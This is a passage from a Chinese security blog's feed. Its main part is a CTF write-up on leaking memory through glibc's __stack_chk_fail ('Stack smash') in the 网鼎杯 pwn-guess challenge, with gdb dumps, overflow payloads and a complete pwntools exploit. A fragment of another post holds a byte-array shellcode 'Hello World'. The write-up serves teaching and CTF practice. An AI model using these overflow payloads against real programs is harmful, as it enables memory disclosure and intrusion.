class="number">0xf6</span>,main43=<span class="number">0x6a</span>,main44=<span class="number">0x2</span>,main45=<span class="number">0x58</span>,main46=<span class="number">0xf</span>,main47=<span class="number">0x5</span>,main48=<span class="number">0x31</span>,main49=<span class="number">0xc0</span>,main50=<span class="number">0x6a</span>,main51=<span class="number">0x3</span>,main52=<span class="number">0x5f</span>,main53=<span class="number">0x6a</span>,main54=<span class="number">0x20</span>,main55=<span class="number">0x5a</span>,main56=<span class="number">0x48</span>,main57=<span class="number">0x89</span>,main58=<span class="number">0xe6</span>,main59=<span class="number">0xf</span>,main60=<span class="number">0x5</span>,main61=<span class="number">0x6a</span>,main62=<span class="number">0x1</span>,main63=<span class="number">0x5f</span>,main64=<span class="number">0x6a</span>,main65=<span class="number">0x20</span>,main66=<span class="number">0x5a</span>,main67=<span class="number">0x48</span>,main68=<span class="number">0x89</span>,main69=<span class="number">0xe6</span>,main70=<span class="number">0x6a</span>,main71=<span class="number">0x1</span>,main72=<span class="number">0x58</span>,main73=<span class="number">0xf</span>,main74=<span class="number">0x5</span>;</span><br></pre></td></tr></table></figure><p>参考：</p><p>有趣的”Hello World”</p><p><a href="https://www.dazhuanlan.com/2020/03/03/5e5d97d48a85f/" target="_blank" rel="noopener">https://www.dazhuanlan.com/2020/03/03/5e5d97d48a85f/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt; 前段时间在逛知乎的时候，偶然发现一道有意思的编程题&lt;br&gt;&lt;img alt=&quot;知乎&quot; data-src=&quot;https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/7hf2r1wl6noec3akgedgzpbq
      
    
    </summary>
    
      <category term="c" scheme="https://nocbtm.github.io/categories/c/"/>
    
    
      <category term="c" scheme="https://nocbtm.github.io/tags/c/"/>
    
  </entry>
  
  <entry>
    <title>__stack_chk_fail相关利用</title>
    <link href="https://nocbtm.github.io/2020/04/28/stack-chk-fail%E7%9B%B8%E5%85%B3%E5%88%A9%E7%94%A8/"/>
    <id>https://nocbtm.github.io/2020/04/28/stack-chk-fail相关利用/</id>
    <published>2020-04-28T03:27:57.000Z</published>
    <updated>2020-04-29T16:16:56.202Z</updated>
    
    <content type="html"><![CDATA[<p>在 Linux 系统应用程序中部署 Canary 漏洞缓解机制可有效防御栈溢出漏洞的攻击，然而在一定环境下，攻击者可利用该机制泄露内存信息，实现进一步的攻击。</p><h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><h2 id="1-Stack-smash"><a href="#1-Stack-smash" class="headerlink" title="1. Stack smash"></a>1. Stack smash</h2><p>Linux 系统中，为了防御栈溢出漏洞的利用，通常会部署 Canary 漏洞缓解措施。Wiki 中对 Canary 的解释如下：</p><blockquote><p>Canaries or canary words are known values that are placed between a buffer and control data on the stack to monitor buffer overflows. When the buffer overflows, the first data to be corrupted will usually be the canary, and a failed verification of the canary data will therefore alert of an overflow, which can then be handled, for example, by invalidating the corrupted data.</p></blockquote><p>下面简单描述下 Canary 的原理。对于栈溢出漏洞的利用，最简单的方法就是通过溢出数据修改栈中函数返回地址为目标内存地址，当函数返回时将会跳转到目标内存处执行指令，从而实现控制流劫持。为了防御这种利用方法，分配栈空间时在 EBP-4 的位置存放一个 Canary 值，函数返回之前会校验该值是否被修改，若检测到被修改则调用 <code>__stack_chk_fail</code> 函数抛出异常并结束进程。可见，要覆盖函数返回地址必须修改 Canary，从而可防御该攻击方法。gcc 编译器默认开启该缓解机制，编译时可用 <code>-fno-stack-protector</code> 选项关闭该机制。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> Low Address |                 |</span><br><span class="line">             +-----------------+</span><br><span class="line">     esp =&gt;  | local variables |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |    buf[0-3]     |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |    buf[4-7]     |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |     canary      |</span><br><span class="line">             +-----------------+</span><br><span class="line">     ebp =&gt;  |     old ebp     |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |   return addr   |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |      args       |</span><br><span class="line">             +-----------------+</span><br><span class="line">High Address |                 |</span><br></pre></td></tr></table></figure><p>libc 中 <code>__stack_chk_fail</code> 的源码如下，该函数调用 <code>__fortify_fail</code> 输出异常信息，其中包含 libc_argv[0] 指向的程序名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">void __attribute__ ((noreturn)) __stack_chk_fail (void)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (&quot;stack smashing detected&quot;);</span><br><span class="line">&#125;</span><br><span class="line">void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)</span><br><span class="line">&#123;</span><br><span class="line">  /* The loop is added only to keep gcc happy.  */</span><br><span class="line">  while (1)</span><br><span class="line">    __libc_message (2, &quot;*** %s ***: %s terminatedn&quot;,</span><br><span class="line">                    msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>若通过栈溢出漏洞可修改栈内存中 argv[0] 指针，那么触发 Stack smash 时可泄露内存信息。例如把 argv[0] 修改为 got 表项可泄露出内存中函数地址，为进一步利用提供条件。</p><h2 id="2-environ"><a href="#2-environ" class="headerlink" title="2. environ"></a>2. environ</h2><p>在 Linux 系统中，glibc 的环境指针 environ(environment pointer) 为程序运行时所需要的环境变量表的起始地址，环境表中的指针指向各环境变量字符串。从以下结果可知环境指针 environ 在栈空间的高地址处。因此，<strong>可通过 environ 指针泄露栈地址</strong>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ vmmap</span><br><span class="line">Start              End                Perm      Name</span><br><span class="line">0x00400000         0x00401000         r-xp      /home/lc/Desktop/guess/guess</span><br><span class="line">0x00601000         0x00602000         r--p      /home/lc/Desktop/guess/guess</span><br><span class="line">0x00602000         0x00603000         rw-p      /home/lc/Desktop/guess/guess</span><br><span class="line">0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp      /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7bcd000 0x00007ffff7dcd000 ---p      /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dcd000 0x00007ffff7dd1000 r--p      /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p      /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p      mapped</span><br><span class="line">0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp      /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7fdb000 0x00007ffff7fde000 rw-p      mapped</span><br><span class="line">0x00007ffff7ff7000 0x00007ffff7ffa000 r--p      [vvar]</span><br><span class="line">0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp      [vdso]</span><br><span class="line">0x00007ffff7ffc000 0x00007ffff7ffd000 r--p      /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p      /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7ffe000 0x00007ffff7fff000 rw-p      mapped</span><br><span class="line">0x00007ffffffde000 0x00007ffffffff000 rw-p      [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 r-xp      [vsyscall]</span><br><span class="line">gdb-peda$ print environ</span><br><span class="line">$1 = (char **) 0x7fffffffdc98</span><br><span class="line">gdb-peda$ telescope 0x7fffffffdc98</span><br><span class="line">0000| 0x7fffffffdc98 --&gt; 0x7fffffffe0ae (&quot;XDG_SESSION_ID=c2&quot;)</span><br><span class="line">0008| 0x7fffffffdca0 --&gt; 0x7fffffffe0c0 (&quot;QT_LINUX_ACCESSIBILITY_ALWAYS_ON=1&quot;)</span><br><span class="line">0016| 0x7fffffffdca8 --&gt; 0x7fffffffe0e3 (&quot;UNITY_DEFAULT_PROFILE=unity&quot;)</span><br><span class="line">0024| 0x7fffffffdcb0 --&gt; 0x7fffffffe0ff (&quot;GNOME_KEYRING_PID=&quot;)</span><br><span class="line">0032| 0x7fffffffdcb8 --&gt; 0x7fffffffe112 (&quot;GNOME_KEYRING_CONTROL=&quot;)</span><br><span class="line">0040| 0x7fffffffdcc0 --&gt; 0x7fffffffe129 (&quot;DEFAULTS_PATH=/usr/share/gconf/ubuntu.default.path&quot;)</span><br><span class="line">0048| 0x7fffffffdcc8 --&gt; 0x7fffffffe15c (&quot;LOGNAME=lc&quot;)</span><br><span class="line">0056| 0x7fffffffdcd0 --&gt; 0x7fffffffe167 (&quot;INSTANCE=&quot;)</span><br></pre></td></tr></table></figure><h1 id="实例分析-网鼎杯-pwn-guess"><a href="#实例分析-网鼎杯-pwn-guess" class="headerlink" title="实例分析  网鼎杯 pwn-guess"></a>实例分析  网鼎杯 pwn-guess</h1><p>下面通过调试 <a href="https://github.com/0x4C43/Linux-Exploit/tree/master/stack_smash" target="_blank" rel="noopener">网鼎杯的 pwn-GUESS</a> 的利用过程说明 Stack smash 利用方法。</p><h2 id="1-漏洞位置"><a href="#1-漏洞位置" class="headerlink" title="1. 漏洞位置"></a>1. 漏洞位置</h2><p>程序首先将 flag 读入内存中的 buf，用户有 3 次猜测 flag 的机会。通过 gets() 读取用户输入时存在栈溢出漏洞。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  puts(&quot;This is GUESS FLAG CHALLENGE!&quot;);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( v6 &gt;= v7 )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;you have no sense... bye :-) &quot;);</span><br><span class="line">      return 0LL;</span><br><span class="line">    &#125;</span><br><span class="line">    v5 = sub_400A11();</span><br><span class="line">    if ( !v5 )</span><br><span class="line">      break;</span><br><span class="line">    ++v6;</span><br><span class="line">    wait((__WAIT_STATUS)&amp;stat_loc);</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;Please type your guessing flag&quot;);</span><br><span class="line">  gets(&amp;s2);         // overflow</span><br><span class="line">  if ( !strcmp(&amp;buf, &amp;s2) )</span><br><span class="line">    puts(&quot;You must have great six sense!!!! :-o &quot;);</span><br><span class="line">  else</span><br><span class="line">    puts(&quot;You should take more effort to get six sence, and one more challenge!!&quot;);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2. 漏洞利用"></a>2. 漏洞利用</h2><p>首先查看程序开启的漏洞缓解机制，发现已开启 Canary 和 NX，未开启 PIE。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ checksec </span><br><span class="line">CANARY    : ENABLED</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : Partial</span><br></pre></td></tr></table></figure><p>由于程序中 sub_400A11() 函数使用 fork 子进程的方式允许用户有 3 次猜测 flag 的机会，同时又将 flag 读入栈中，因此可利用 Stack smash 进行 3 次内存泄漏获得 flag。具体利用思路如下：</p><ul><li>通过栈溢出漏洞覆盖 argv[0] 为 <code>__libc_start_main</code> 的 got 表项，触发 Stack smash 可泄露 <code>__libc_start_main</code> 函数地址，利用给出的 libc 文件可计算得到 libc 基地址；</li><li>计算出 environ 在内存中的地址，第二次利用栈溢出漏洞覆盖 argv[0] 为 <code>environ</code> ，泄露出 environ 的值，即指向环境变量的栈地址；</li><li>根据栈内存中 flag 与 environ 值的偏移量计算出 flag 的栈地址，再次利用栈溢出漏洞覆盖 argv[0] 为 flag 的栈地址，从而可读取 flag 的值。</li></ul><h3 id="1）泄露-libc-基址"><a href="#1）泄露-libc-基址" class="headerlink" title="1）泄露 libc 基址"></a>1）泄露 libc 基址</h3><p>首先，从下图栈内存信息可知缓冲区 s2 地址为 0x7fffffffdb60， argv[0] 地址为 0x7fffffffdc88，从而可计算出 s2 与 argv[0] 间的偏移量为 0x128（0x7fffffffdc88-0x7fffffffdb60）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x400b1b:    mov    rdi,rax</span><br><span class="line">   0x400b1e:    mov    eax,0x0</span><br><span class="line">   0x400b23:    call   0x400830 &lt;gets@plt&gt;</span><br><span class="line">=&gt; 0x400b28:    lea    rdx,[rbp-0x40]</span><br><span class="line">   0x400b2c:    lea    rax,[rbp-0x70]</span><br><span class="line">   0x400b30:    mov    rsi,rdx</span><br><span class="line">   0x400b33:    mov    rdi,rax</span><br><span class="line">   0x400b36:    call   0x400820 &lt;strcmp@plt&gt;</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0x0000000000400b28 in ?? ()</span><br><span class="line">gdb-peda$ stack 20</span><br><span class="line">0000| 0x7fffffffdb00 --&gt; 0x7fffffffdc88 --&gt; 0x7fffffffe091 (&quot;/home/lc/Desktop/guess/guess&quot;)</span><br><span class="line">0008| 0x7fffffffdb08 --&gt; 0x100000000 </span><br><span class="line">0016| 0x7fffffffdb10 --&gt; 0x0 </span><br><span class="line">0024| 0x7fffffffdb18 --&gt; 0x3 </span><br><span class="line">0032| 0x7fffffffdb20 --&gt; 0x0 </span><br><span class="line">0040| 0x7fffffffdb28 --&gt; 0x3 </span><br><span class="line">0048| 0x7fffffffdb30 (&quot;flag&#123;43861991f7e943090e257863eec75961&#125;\n&quot;)</span><br><span class="line">0056| 0x7fffffffdb38 (&quot;61991f7e943090e257863eec75961&#125;\n&quot;)</span><br><span class="line">0064| 0x7fffffffdb40 (&quot;943090e257863eec75961&#125;\n&quot;)</span><br><span class="line">0072| 0x7fffffffdb48 (&quot;57863eec75961&#125;\n&quot;)</span><br><span class="line">0080| 0x7fffffffdb50 --&gt; 0xa7d3136393537 (&apos;75961&#125;\n&apos;)</span><br><span class="line">0088| 0x7fffffffdb58 --&gt; 0x0 </span><br><span class="line">0096| 0x7fffffffdb60 (&apos;A&apos; &lt;repeats 16 times&gt;)</span><br><span class="line">0104| 0x7fffffffdb68 (&quot;AAAAAAAA&quot;)</span><br><span class="line">0112| 0x7fffffffdb70 --&gt; 0x0</span><br></pre></td></tr></table></figure><p>因此可构造以下 payload 将 argv[0] 覆盖为 <code>__libc_start_main</code> 的 got 表项，可泄露出 <code>__libc_start_main</code> 函数在内存中的地址，从而计算出 libc 的基址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = &apos;A&apos; * 0x128 + p64(libc_start_main_got)</span><br><span class="line">libc_base_addr = libc_start_main_addr - libc.symbols[&apos;__libc_start_main&apos;]</span><br></pre></td></tr></table></figure><p>泄露出 libc 基址为 0x7ffff7a0d000。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0x7a bytes:</span><br><span class="line">    00000000  59 6f 75 20  73 68 6f 75  6c 64 20 74  61 6b 65 20  │You │shou│ld t│ake │</span><br><span class="line">    00000010  6d 6f 72 65  20 65 66 66  6f 72 74 20  74 6f 20 67  │more│ eff│ort │to g│</span><br><span class="line">    00000020  65 74 20 73  69 78 20 73  65 6e 63 65  2c 20 61 6e  │et s│ix s│ence│, an│</span><br><span class="line">    00000030  64 20 6f 6e  65 20 6d 6f  72 65 20 63  68 61 6c 6c  │d on│e mo│re c│hall│</span><br><span class="line">    00000040  65 6e 67 65  21 21 0a 2a  2a 2a 20 73  74 61 63 6b  │enge│!!·*│** s│tack│</span><br><span class="line">    00000050  20 73 6d 61  73 68 69 6e  67 20 64 65  74 65 63 74  │ sma│shin│g de│tect│</span><br><span class="line">    00000060  65 64 20 2a  2a 2a 3a 20  40 d7 a2 f7  ff 7f 20 74  │ed *│**: │@···│·· t│</span><br><span class="line">    00000070  65 72 6d 69  6e 61 74 65  64 0a                     │ermi│nate│d·│</span><br><span class="line">    0000007a</span><br><span class="line">libc_base_addr = 0x7ffff7a0d000</span><br></pre></td></tr></table></figure><h3 id="2）泄露-environ"><a href="#2）泄露-environ" class="headerlink" title="2）泄露 environ"></a>2）泄露 environ</h3><p>构造以下 payload，第二次利用栈溢出将 argv[0] 覆盖为 <code>environ</code> 的地址，从而泄露出 <code>environ</code> 的值，该值为执行环境变量的栈地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">environ_addr = libc_base_addr + libc.symbols[&apos;_environ&apos;]</span><br><span class="line">payload1 = &apos;A&apos; * 0x128 + p64(environ_addr)</span><br></pre></td></tr></table></figure><p>泄露出 <code>environ</code> 的值为 0x7fffffffdcf8。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0x7a bytes:</span><br><span class="line">    00000000  59 6f 75 20  73 68 6f 75  6c 64 20 74  61 6b 65 20  │You │shou│ld t│ake │</span><br><span class="line">    00000010  6d 6f 72 65  20 65 66 66  6f 72 74 20  74 6f 20 67  │more│ eff│ort │to g│</span><br><span class="line">    00000020  65 74 20 73  69 78 20 73  65 6e 63 65  2c 20 61 6e  │et s│ix s│ence│, an│</span><br><span class="line">    00000030  64 20 6f 6e  65 20 6d 6f  72 65 20 63  68 61 6c 6c  │d on│e mo│re c│hall│</span><br><span class="line">    00000040  65 6e 67 65  21 21 0a 2a  2a 2a 20 73  74 61 63 6b  │enge│!!·*│** s│tack│</span><br><span class="line">    00000050  20 73 6d 61  73 68 69 6e  67 20 64 65  74 65 63 74  │ sma│shin│g de│tect│</span><br><span class="line">    00000060  65 64 20 2a  2a 2a 3a 20  f8 dc ff ff  ff 7f 20 74  │ed *│**: │····│·· t│</span><br><span class="line">    00000070  65 72 6d 69  6e 61 74 65  64 0a                     │ermi│nate│d·│</span><br><span class="line">    0000007a</span><br><span class="line">stack_addr = 0x7fffffffdcf8</span><br></pre></td></tr></table></figure><p>可在 gdb 中验证该值为正确的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ print environ</span><br><span class="line">$1 = (char **) 0x7fffffffdcf8</span><br><span class="line">gdb-peda$ telescope 0x7fffffffdcf8</span><br><span class="line">0000| 0x7fffffffdcf8 --&gt; 0x7fffffffe0ea (&quot;INSTANCE=&quot;)</span><br><span class="line">0008| 0x7fffffffdd00 --&gt; 0x7fffffffe0f4 (&quot;MANDATORY_PATH=/usr/share/gconf/ubuntu.mandatory.path&quot;)</span><br><span class="line">0016| 0x7fffffffdd08 --&gt; 0x7fffffffe12a (&quot;ALL_PROXY=socks://192.168.239.1:1080/&quot;)</span><br><span class="line">       ...</span><br></pre></td></tr></table></figure><h3 id="3）读取-flag"><a href="#3）读取-flag" class="headerlink" title="3）读取 flag"></a>3）读取 flag</h3><p>查看内存中 flag 的地址为 0x7fffffffdb90，计算该地址与泄露栈地址的偏移量为 0x168（0x7fffffffdcf8 - 0x7fffffffdb90）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ stack 20                                                                                                                                             </span><br><span class="line">0000| 0x7fffffffdb08 --&gt; 0x7ffff7a875e8 (&lt;_IO_new_file_underflow+328&gt;:  cmp    rax,0x0)</span><br><span class="line">0008| 0x7fffffffdb10 --&gt; 0x7ffff7dd3780 --&gt; 0x0 </span><br><span class="line">     ...</span><br><span class="line">0088| 0x7fffffffdb60 --&gt; 0x7fffffffdce8 --&gt; 0x7fffffffe0e2 --&gt; 0x73736575672f2e (&apos;./guess&apos;)</span><br><span class="line">0096| 0x7fffffffdb68 --&gt; 0x100000000 </span><br><span class="line">0104| 0x7fffffffdb70 --&gt; 0x8600000000 </span><br><span class="line">0112| 0x7fffffffdb78 --&gt; 0x3 </span><br><span class="line">0120| 0x7fffffffdb80 --&gt; 0x2 </span><br><span class="line">0128| 0x7fffffffdb88 --&gt; 0x3 </span><br><span class="line">0136| 0x7fffffffdb90 (&quot;flag&#123;43861991f7e943090e257863eec75961&#125;\n&quot;)</span><br><span class="line">     ...</span><br></pre></td></tr></table></figure><p>构造以下 payload，第三次利用栈溢出覆盖 argv[0] 为 flag 的内存地址，从而可读取内存中的 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload2 = &apos;A&apos; * 0x128 + p64(stack_addr - 0x168)</span><br></pre></td></tr></table></figure><p>最终获取 flag 如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0x9b bytes:</span><br><span class="line">    &apos;You should take more effort to get six sence, and one more challenge!!\n&apos;</span><br><span class="line">    &apos;*** stack smashing detected ***: flag&#123;43861991f7e943090e257863eec75961&#125;\n&apos;</span><br><span class="line">    &apos; terminated\n&apos;</span><br><span class="line">You should take more effort to get six sence, and one more challenge!!</span><br><span class="line">*** stack smashing detected ***: flag&#123;43861991f7e943090e257863eec75961&#125;</span><br><span class="line"> terminated</span><br></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = process(<span class="string">'./guess'</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line">libc_start_main_got = <span class="number">0x602048</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line"><span class="comment">#dbg(0x400B23)    </span></span><br><span class="line"><span class="comment">#raw_input("leak libc_base")</span></span><br><span class="line">p.recvuntil(<span class="string">'guessing flag\n'</span>)</span><br><span class="line">payload = <span class="string">'A'</span> * <span class="number">0x128</span> + p64(libc_start_main_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">'detected ***: '</span>)</span><br><span class="line">libc_start_main_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base_addr = libc_start_main_addr - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'libc_base_addr = '</span> + hex(libc_base_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#raw_input("leak environ_addr")</span></span><br><span class="line">environ_addr = libc_base_addr + libc.symbols[<span class="string">'_environ'</span>]</span><br><span class="line">payload1 = <span class="string">'A'</span> * <span class="number">0x128</span> + p64(environ_addr)</span><br><span class="line">p.recvuntil(<span class="string">'Please type your guessing flag'</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">'stack smashing detected ***: '</span>)</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'stack_addr = '</span> + hex(stack_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#raw_input("leak flag")</span></span><br><span class="line">payload2 = <span class="string">'A'</span> * <span class="number">0x128</span> + p64(stack_addr - <span class="number">0x168</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Please type your guessing flag'</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">'&#125;'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><hr><p>References:</p><p><a href="http://0x4c43.cn/2018/1013/stack-overflow-smash-utilization/" target="_blank" rel="noopener">栈溢出 Stack smash 利用</a></p><p><a 